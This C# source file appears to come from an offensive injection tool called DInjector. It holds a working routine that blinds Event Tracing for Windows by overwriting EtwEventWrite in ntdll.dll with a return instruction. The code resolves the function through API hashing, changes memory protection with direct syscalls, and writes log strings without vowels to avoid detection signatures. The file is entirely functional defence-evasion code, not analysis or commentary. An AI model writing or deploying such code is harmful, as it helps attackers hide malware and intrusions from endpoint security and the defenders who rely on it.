using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class ETW
    {
        // ret
        static readonly byte[] x64 = new byte[] { 0xC3 };
        //static readonly byte[] x86 = new byte[] { 0xC2, 0x14, 0x00 };

        public static void Block()
        {
            ChangeBytes(x64);
        }

        static void ChangeBytes(byte[] patch)
        {
            try
            {
                // { API_HASHING:EtwEventWrite }
                var funcAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("ntdll.dll", "ce35786496ffe1894268e36866606be4", 0x98a71847);

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr processHandle = IntPtr.Zero; // Process.GetCurrentProcess().Handle
                IntPtr protectAddress = funcAddress;
                IntPtr regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                NTSTATUS ntstatus = Syscalls.NtProtectVirtualMemory(
                    processHandle,
                    ref protectAddress,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(ETW) [+] NtPrtctVrtlMmry, PAGE_READWRITE");
                else
                    throw new Exception($"(ETW) [-] NtPrtctVrtlMmry, PAGE_READWRITE: {ntstatus}");

                #endregion

                Console.WriteLine($"(ETW) [>] Blocking ETW at address: " + string.Format("{0:X}", funcAddress.ToInt64()));
                Marshal.Copy(patch, 0, funcAddress, patch.Length);

                #region NtProtectVirtualMemory (oldProtect)

                regionSize = (IntPtr)patch.Length;
                uint tmpProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    processHandle,
                    ref funcAddress,
                    ref regionSize,
                    oldProtect,
                    ref tmpProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(ETW) [+] NtPrtctVrtlMmry, oldProtect");
                else
                    throw new Exception($"(ETW) [-] NtPrtctVrtlMmry, oldProtect: {ntstatus}");

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(ETW) [x] {e.Message}");
                Console.WriteLine($"(ETW) [x] {e.InnerException}");
            }
        }
    }
}